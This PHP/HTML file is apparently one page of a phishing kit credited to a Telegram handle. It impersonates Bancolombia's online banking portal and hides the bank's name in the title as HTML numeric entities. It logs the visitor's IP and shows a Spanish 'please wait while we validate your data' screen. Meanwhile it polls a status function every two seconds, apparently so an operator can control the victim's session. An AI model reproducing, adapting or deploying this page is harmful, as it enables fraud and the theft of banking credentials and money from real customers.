<?php
/**
###############################################
#     Version 2.0                             #
#     https://t.me/neo_net                    #
#     Simular Datos Reales de kamehouse     #
###############################################
**/
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>

<html><head>
  <title>&#66;&#97;&#110;&#99;&#111;&#108;&#111;&#109;&#98;&#105;&#97;&#32;&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#32;&#86;&#105;&#114;&#116;&#117;&#97;&#108;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#115;</title>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta charset="utf-8">
  <meta content="es" http-equiv="Content-Language">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link href="mua/css/styles.css" media="all" rel="stylesheet" type="text/css">
  <link href="mua/css/bootstrap.css" media="all" rel="stylesheet" type="text/css">  
<!--[if lt IE 8]>
    <link href="mua/css/bootstrap-ie7.css" rel="stylesheet">
<![endif]-->
      <!--[if lt IE 9]>
      <script src="mua/js/html5shiv.js"></script>
      <script src="mua/js/respond.min.js"></script>
   <![endif]-->
	<script type="text/javascript" src="mua/js/jquery-3.6.0.min.js"></script>
	<script type="text/javascript" src="mua/js/jquery.cookie.js"></script>
	<script type="text/javascript" src="mua/js/patterns/jquery.validate-1.11.1.js"></script>
	<script type="text/javascript" src="mua/js/patterns/validations.js"></script>
	<script type="text/javascript" src="mua/js/patterns/jquery-validations.js"></script>
	<script type="text/javascript" src="mua/js/patterns/blockKeys.js"></script>
	<script type="text/javascript" src="mua/js/jquery-ui.js"></script>
	<script type="text/javascript" src="mua/js/bluebird.min.js"></script>
	<link href="mua/css/jquery-ui.css" media="all" rel="stylesheet" type="text/css"> 
   	<link href="mua/css/ui.css" media="all" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="favicon.ico">
<script type="text/javascript" src="mua/js/app.js"></script>
</head>
<body style="">
			
	<div class="row row-logo-svp" style="text-align:center;    margin-top: 13%;"> 		
			<div class="mua-imgLogoItem" style="margin: 0 auto;"></div>
			
			<br><p class="text-center" style="width:90%; max-width: 457px; display: inline-block;">Por favor espere n momento estamos validando algunos datos. Puede tardar entre 1 a 5 minuto. No cierres o recargues esta ventana.</p><br>
			<img src="load2.gif" />

	</div>					
		
	
			
<meta http-equiv="PRAGMA" content="NO-CACHE"> 
<meta http-equiv="Expires" content="-1">
	</body>
</html>
<script language="javascript">
$(document).ready(function() {
	setInterval(consultar_estado,2000);	
});
</script>